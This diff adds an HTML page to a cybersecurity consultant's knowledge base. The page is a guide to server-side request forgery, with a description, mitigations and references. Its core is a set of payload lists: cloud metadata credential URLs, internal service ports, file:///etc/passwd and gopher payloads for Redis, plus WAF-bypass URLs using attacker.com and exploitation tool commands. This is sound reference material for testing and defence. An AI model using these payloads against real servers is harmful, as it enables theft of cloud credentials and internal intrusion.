@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSRF | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../resume.html">Resume</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Server-Side Request Forgery (SSRF)</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity | OWASP A10:2021</span>
+      <h1>📌 Server-Side Request Forgery (SSRF)</h1>
+    </div>
+
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is SSRF?</strong></p>
+      <p>Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to induce the server to make requests to an arbitrary domain, including internal services that are not directly accessible from the internet.</p>
+      <p><strong>Types of SSRF:</strong></p>
+      <ul>
+        <li><strong>Basic SSRF:</strong> Response is returned to the attacker</li>
+        <li><strong>Blind SSRF:</strong> No response, but requests are made (detect via DNS/HTTP callbacks)</li>
+        <li><strong>Partial SSRF:</strong> Only partial response or error messages</li>
+      </ul>
+      <p><strong>Security principle violated:</strong> Input Validation / Network Segmentation</p>
+    </div>
+
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Server-Side Request Forgery</li>
+        <li><strong>OWASP:</strong> A10:2021 – Server-Side Request Forgery</li>
+        <li><strong>CWE:</strong> CWE-918: Server-Side Request Forgery (SSRF)</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ URL parameters (<code>?url=</code>, <code>?callback=</code>, <code>?dest=</code>)</li>
+        <li>✅ POST body (JSON with URL fields)</li>
+        <li>✅ File uploads (URL in filename or metadata)</li>
+        <li>✅ API endpoints that fetch external resources</li>
+        <li>✅ Webhooks</li>
+        <li>✅ Image/proxy endpoints</li>
+        <li>✅ PDF generators</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>💣 Basic Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">http://127.0.0.1</div>
+        <div class="payload-item">http://localhost</div>
+        <div class="payload-item">http://0.0.0.0</div>
+        <div class="payload-item">http://[::1]</div>
+        <div class="payload-item">http://169.254.169.254</div>
+        <div class="payload-item">http://localhost:8080</div>
+        <div class="payload-item">http://127.0.0.1:22</div>
+        <div class="payload-item">http://127.0.0.1:3306</div>
+      </div>
+
+      <div class="payload-category">☁️ Cloud Metadata Endpoints</div>
+      <div class="payload-grid">
+        <div class="payload-item">http://169.254.169.254/latest/meta-data/</div>
+        <div class="payload-item">http://169.254.169.254/latest/user-data/</div>
+        <div class="payload-item">http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+        <div class="payload-item">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</div>
+        <div class="payload-item">http://169.254.169.254/latest/meta-data/network/interfaces/macs/</div>
+        <div class="payload-item">http://169.254.169.254/latest/meta-data/public-keys/</div>
+        <div class="payload-item">http://169.254.170.2/v2/credentials/ (AWS ECS)</div>
+        <div class="payload-item">http://metadata.google.internal/computeMetadata/v1/</div>
+        <div class="payload-item">http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</div>
+        <div class="payload-item">http://metadata.google.internal/computeMetadata/v1/project/project-id</div>
+        <div class="payload-item">http://169.254.169.254/metadata/instance?api-version=2017-08-01 (Azure)</div>
+        <div class="payload-item">http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01 (Azure)</div>
+        <div class="payload-item">http://169.254.169.254/metadata/v1.json (DigitalOcean)</div>
+        <div class="payload-item">http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address</div>
+        <div class="payload-item">http://169.254.169.254/openstack/latest/meta_data.json (OpenStack)</div>
+      </div>
+
+      <div class="payload-category">🔌 Internal Service Discovery</div>
+      <div class="payload-grid">
+        <div class="payload-item">http://localhost:22 (SSH)</div>
+        <div class="payload-item">http://localhost:80 (HTTP)</div>
+        <div class="payload-item">http://localhost:443 (HTTPS)</div>
+        <div class="payload-item">http://localhost:3306 (MySQL)</div>
+        <div class="payload-item">http://localhost:5432 (PostgreSQL)</div>
+        <div class="payload-item">http://localhost:6379 (Redis)</div>
+        <div class="payload-item">http://localhost:27017 (MongoDB)</div>
+        <div class="payload-item">http://localhost:9200 (Elasticsearch)</div>
+        <div class="payload-item">http://localhost:8080 (Tomcat/Jenkins)</div>
+        <div class="payload-item">http://localhost:9090 (Prometheus)</div>
+        <div class="payload-item">http://localhost:3000 (Grafana)</div>
+        <div class="payload-item">http://localhost:5601 (Kibana)</div>
+        <div class="payload-item">http://localhost:15672 (RabbitMQ)</div>
+        <div class="payload-item">http://localhost:9000 (MinIO)</div>
+        <div class="payload-item">http://localhost:8000 (Django)</div>
+      </div>
+
+      <div class="payload-category">🔄 Protocol Handlers</div>
+      <div class="payload-grid">
+        <div class="payload-item">file:///etc/passwd</div>
+        <div class="payload-item">file:///c:/windows/win.ini</div>
+        <div class="payload-item">dict://localhost:11211/stat</div>
+        <div class="payload-item">gopher://localhost:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a</div>
+        <div class="payload-item">ftp://127.0.0.1:21</div>
+        <div class="payload-item">gopher://127.0.0.1:8080/_GET / HTTP/1.0%0A%0A</div>
+        <div class="payload-item">dict://127.0.0.1:22/info</div>
+        <div class="payload-item">ldap://127.0.0.1:389</div>
+      </div>
+
+      <div class="payload-category">🛡️ WAF Bypass Techniques</div>
+      <div class="payload-grid">
+        <div class="payload-item">http://2130706433/ (Decimal IP)</div>
+        <div class="payload-item">http://0x7f000001/ (Hex IP)</div>
+        <div class="payload-item">http://0177.0.0.1/ (Octal IP)</div>
+        <div class="payload-item">http://127.0.0.1.nip.io/ (DNS trick)</div>
+        <div class="payload-item">http://localhost@attacker.com/</div>
+        <div class="payload-item">http://attacker.com#@127.0.0.1/</div>
+        <div class="payload-item">http://127.0.0.1@attacker.com/</div>
+        <div class="payload-item">http://127.0.0.1.attacker.com/</div>
+        <div class="payload-item">https://127.0.0.1/ (HTTPS)</div>
+        <div class="payload-item">http://127.0.0.1:65535/ (High port)</div>
+        <div class="payload-item">http://[::1]/ (IPv6)</div>
+        <div class="payload-item">http://0/ (Shortcut for 0.0.0.0)</div>
+      </div>
+
+      <div class="payload-category">🔧 SSRF Automation Tools</div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># SSRFmap
+python3 ssrfmap.py -r request.txt -p url
+
+# Gopherus - Generate gopher payloads
+python gopherus.py --exploit mysql
+python gopherus.py --exploit redis
+
+# Interactsh for blind SSRF
+interactsh-client
+
+# Nuclei SSRF templates
+nuclei -u "https://target.com" -t ~/nuclei-templates/ssrf/</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🧪 Test Cases</h2>
+      <table>
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Inject <code>http://127.0.0.1:22</code></td><td>No response/error</td><td>SSH banner returned</td></tr>
+          <tr><td>2</td><td>Inject <code>http://169.254.169.254/latest/meta-data/</code></td><td>No response</td><td>AWS metadata returned</td></tr>
+          <tr><td>3</td><td>Inject <code>file:///etc/passwd</code></td><td>No response</td><td>File contents returned</td></tr>
+        </tbody>
+       </table>
+    </div>
+
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify parameter that fetches URLs (avatar, webhook, proxy)</li>
+        <li>Test with <code>http://127.0.0.1:22</code> to check response</li>
+        <li>Use Burp Collaborator or Interactsh for blind detection</li>
+        <li>Enumerate internal ports (port scanning via status codes/timeouts)</li>
+        <li>Access cloud metadata endpoints</li>
+        <li>Use gopher/dict protocols to interact with internal services</li>
+        <li>Escalate to RCE via Redis/MySQL/other services</li>
+      </ol>
+    </div>
+
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Allowlist Approach:</strong> Only allow requests to trusted domains<br>
+        <strong>✅ Deny Internal IPs:</strong> Block access to private IP ranges<br>
+        <strong>✅ Disable Unnecessary Protocols:</strong> Disable file://, dict://, gopher://<br>
+        <strong>✅ Network Segmentation:</strong> Isolate internal services<br>
+        <strong>✅ Response Handling:</strong> Don't return raw responses to client<br>
+        <strong>✅ Regular Audits:</strong> Scan for SSRF vulnerabilities
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li>Access cloud metadata (AWS IAM credentials)</li>
+          <li>Port scan internal network</li>
+          <li>Access internal services (Redis, MySQL, Kubernetes API)</li>
+          <li>Read local files (file:// protocol)</li>
+          <li>RCE via Redis/MySQL/other services</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/ssrf" class="reference-link" target="_blank">PortSwigger: SSRF</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" class="reference-link" target="_blank">PayloadsAllTheThings: SSRF</a></li>
+        <li><a href="https://github.com/coffinxp/payloads/blob/main/ssrf.txt" class="reference-link" target="_blank">CoffinXP: SSRF Payloads</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | SSRF - Complete Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
